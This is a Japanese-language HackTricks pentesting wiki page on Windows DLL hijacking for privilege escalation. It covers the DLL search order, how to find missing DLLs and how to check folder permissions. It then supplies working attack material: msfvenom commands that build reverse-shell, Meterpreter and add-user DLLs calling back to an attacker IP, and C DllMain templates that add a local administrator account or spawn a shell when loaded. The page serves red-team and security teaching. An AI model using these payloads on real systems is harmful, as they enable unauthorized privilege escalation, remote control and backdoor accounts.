# Dll Hijacking

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong>を使用して、**ゼロからヒーローまでAWSハッキングを学ぶ**！</summary>

HackTricksをサポートする他の方法：

- **会社をHackTricksで宣伝する**か、**HackTricksをPDFでダウンロードする**には、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**する。
- **ハッキングトリックを共有するには、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください**。

</details>

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**バグバウンティのヒント**: **ハッカーによって作成されたプレミアムなバグバウンティプラットフォームであるIntigritiにサインアップ**して、**最大$100,000**のバウンティを獲得しましょう！[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) で参加してください。

{% embed url="https://go.intigriti.com/hacktricks" %}

## 基本情報

DLLハイジャッキングは、信頼されたアプリケーションを悪意のあるDLLを読み込むように操作することを指します。この用語には、**DLLスプーフィング、インジェクション、およびサイドローディング**などの複数の戦術が含まれます。主にコードの実行、持続性の達成、そして稀に特権昇格に使用されます。ここでは昇格に焦点を当てていますが、ハイジャッキングの方法は目的に関係なく一貫しています。

### 一般的な技術

DLLハイジャッキングには、アプリケーションのDLL読み込み戦略に依存する効果が異なるいくつかの方法があります。

1. **DLLの置換**: 正規のDLLを悪意のあるDLLと交換し、オプションでDLLプロキシングを使用して元のDLLの機能を維持します。
2. **DLLサーチオーダーハイジャッキング**: 悪意のあるDLLを正規のDLLの前に検索パスに配置し、アプリケーションの検索パターンを悪用します。
3. **ファントムDLLハイジャッキング**: アプリケーションが読み込む必要があると思っている存在しないDLLを作成します。
4. **DLLリダイレクション**: `%PATH%`や`.exe.manifest` / `.exe.local`ファイルなどの検索パラメータを変更して、アプリケーションを悪意のあるDLLに誘導します。
5. **WinSxS DLLの置換**: WinSxSディレクトリ内の正規のDLLを悪意のあるDLLに置き換える方法であり、DLLサイドローディングとしばしば関連付けられます。
6. **相対パスDLLハイジャッキング**: コピーされたアプリケーションと共にユーザーが制御するディレクトリに悪意のあるDLLを配置し、バイナリプロキシ実行技術を模倣します。

## 欠落しているDLLの検出

システム内の欠落しているDLLを見つける最も一般的な方法は、[procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)を実行し、次の2つのフィルターを**設定**することです：

![](<../../../.gitbook/assets/image (961).png>)

![](<../../../.gitbook/assets/image (230).png>)

そして、**ファイルシステムアクティビティ**を表示します：

![](<../../../.gitbook/assets/image (153).png>)

**一般的な欠落しているDLLを探している場合**は、数秒間これを実行しておきます。\
**特定の実行可能ファイル内の欠落しているDLLを探している場合**は、「プロセス名」が「\<exec name>」を含むような別のフィルターを設定し、実行してからイベントのキャプチャを停止します。

## 欠落しているDLLの悪用

特権を昇格させるためには、**特権プロセスが読み込もうとするDLLを書き込むことができる**最善の方法は、**検索される場所のいずれかにDLLを書き込む**ことです。したがって、**元のDLLよりも前にDLLが検索されるフォルダー**にDLLを**書き込む**ことができるか、または**DLLが存在しない**フォルダーにDLLが検索される**フォルダーに書き込む**ことができます。

### DLL検索順序

[**Microsoftのドキュメント**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **内で、DLLが特定の方法で読み込まれる方法が記載されています。**

**Windowsアプリケーション**は、特定のシーケンスに従って一連の**事前定義された検索パス**に従ってDLLを検索します。DLLハイジャッキングの問題は、有害なDLLがこれらのディレクトリの1つに戦略的に配置され、正規のDLLよりも先に読み込まれるようにすることで発生します。これを防ぐ解決策は、アプリケーションが必要とするDLLを参照する際に絶対パスを使用することを確認することです。

32ビットシステムでの**DLL検索順序**は以下の通りです：

1. アプリケーションが読み込まれたディレクトリ。
2. システムディレクトリ。このディレクトリのパスを取得するには、[**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 関数を使用します。(_C:\Windows\System32_)
3. 16ビットシステムディレクトリ。このディレクトリのパスを取得する関数はありませんが、検索されます。(_C:\Windows\System_)
4. Windowsディレクトリ。このディレクトリのパスを取得するには、[**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 関数を使用します。(_C:\Windows_)
5. 現在のディレクトリ。
6. PATH環境変数にリストされているディレクトリ。これには、**App Paths**レジストリキーで指定されたアプリケーションごとのパスは含まれません。**App Paths**キーは、DLL検索パスの計算に使用されません。

これが**SafeDllSearchMode**が有効な状態での**デフォルト**の検索順序です。無効にするには、**HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** レジストリ値を作成し、0に設定します（デフォルトは有効）。

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 関数が**LOAD\_WITH\_ALTERED\_SEARCH\_PATH**で呼び出されると、検索は**LoadLibraryEx**が読み込んでいる実行可能モジュールのディレクトリから開始されます。

最後に、**絶対パスを指定してDLLを読み込むこともできます**。その場合、そのDLLは**そのパスのみで検索されます**（DLLに依存関係がある場合、名前で読み込まれるだけです）。

検索順序を変更する他の方法もありますが、ここでは説明しません。
#### Windowsドキュメントからのdll検索順序の例外

Windowsのドキュメントには、標準のDLL検索順序に対する特定の例外が記載されています：

- メモリにすでに読み込まれているDLLと同じ名前のDLLが見つかった場合、システムは通常の検索をバイパスします。代わりに、リダイレクトとマニフェストのチェックを実行し、メモリにすでにあるDLLにデフォルトで移行します。このシナリオでは、システムはDLLの検索を実行しません。
- DLLが現在のWindowsバージョンの**既知のDLL**として認識される場合、システムは既知のDLLのバージョンを利用し、依存するDLLと共に検索プロセスをスキップします。レジストリキー**HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**には、これらの既知のDLLのリストが保存されています。
- DLLに依存関係がある場合、依存するDLLの検索は、初期のDLLが完全なパスを介して特定されたかどうかに関係なく、その**モジュール名**のみで指定されたかのように実行されます。

### 特権の昇格

**要件**：

- **異なる特権**（水平または垂直移動）で動作するプロセスを特定し、**DLLが不足している**ことを確認します。
- **DLL**が**検索されるディレクトリ**に**書き込みアクセス**が利用可能であることを確認します。この場所は、実行可能ファイルのディレクトリまたはシステムパス内のディレクトリである可能性があります。

はい、要件を見つけるのは複雑です。**デフォルトでは特権のある実行可能ファイルがDLLを欠いているのは奇妙**であり、**システムパスフォルダに書き込み権限を持っているのはさらに奇妙**です（通常はできません）。ただし、構成が誤っている環境では、これが可能です。\
要件を満たすことができる幸運な場合、[UACME](https://github.com/hfiref0x/UACME)プロジェクトをチェックできます。プロジェクトの**主な目標はUACのバイパス**ですが、おそらく書き込み権限があるフォルダのパスを変更するだけで使用できるWindowsバージョンのDLLハイジャッキングのPoCが見つかるかもしれません。

フォルダの**アクセス許可を確認する**には、次のようにします：
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
そして、**PATH内のすべてのフォルダのアクセス許可を確認します**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
あなたは実行可能ファイルのインポートとDLLのエクスポートも次のようにチェックできます：
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
**Dll Hijackingを濫用して特権を昇格**する方法の完全ガイドについては、**System Pathフォルダ**に書き込み権限があるかどうかを確認してください：

{% content-ref url="writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### 自動化ツール

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は、システムPATH内の任意のフォルダに書き込み権限があるかどうかをチェックします。\
この脆弱性を発見するための他の興味深い自動化ツールには、**PowerSploit functions**：_Find-ProcessDLLHijack_、_Find-PathDLLHijack_、_Write-HijackDll_ があります。

### 例

悪用可能なシナリオを見つけた場合、それを成功裏に悪用するために最も重要なことの1つは、**実行ファイルがそれからインポートする少なくともすべての関数をエクスポートするdllを作成する**ことです。とにかく、Dll Hijackingは、中間インテグリティレベルから高いレベルに[**（UACをバイパスして）昇格する**](../../authentication-credentials-uac-and-efs/#uac)か、[**高いインテグリティからSYSTEMに**](../#from-high-integrity-to-system)**昇格する**ために便利です。**有効なdllを作成する方法**の例は、このdllハイジャッキング研究に焦点を当てたサンプルで見つけることができます：[**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**。**\
さらに、**次のセクション**では、**テンプレートとして役立つ基本的なdllコード**や、**不要な関数がエクスポートされたdllを作成する**ためのものがいくつか見つかります。

## **Dllの作成とコンパイル**

### **Dllプロキシ化**

基本的に**Dllプロキシ**は、**ロードされるときに悪意のあるコードを実行**できるDllであり、また**実際のライブラリにすべての呼び出しをリレーすることで**、**公開**され、**機能**することができます。

ツール[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant)または[**Spartacus**](https://github.com/Accenture/Spartacus)を使用すると、実際のライブラリに**プロキシ化したdllを生成**するために、実行可能ファイルを指定し、または**Dllを指定してプロキシ化したdllを生成**することができます。

### **Meterpreter**

**rev shellを取得（x64）:**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**メータープリンタを取得する（x86）:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**ユーザーを作成します（x86バージョンはx64バージョンは見当たりませんでした）:**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### あなた自身

複数の場合において、コンパイルしたDllは**複数の関数をエクスポート**しなければならず、これらの関数が存在しない場合、**バイナリはそれらをロードできず**、**エクスプロイトは失敗します**。
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## 参考文献

* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**バグバウンティのヒント**: **Intigriti** に **サインアップ** してください。これはハッカーによって作成されたプレミアム **バグバウンティプラットフォーム** です！[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) で参加し、最大 **$100,000** のバウンティを獲得しましょう！

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>**htARTE (HackTricks AWS Red Team Expert)** で **ゼロからヒーローまでのAWSハッキングを学びましょう**！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい**場合や **HackTricks をPDFでダウンロード** したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手してください
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つけてください
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live) をフォローしてください
* **HackTricks** と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください

</details>
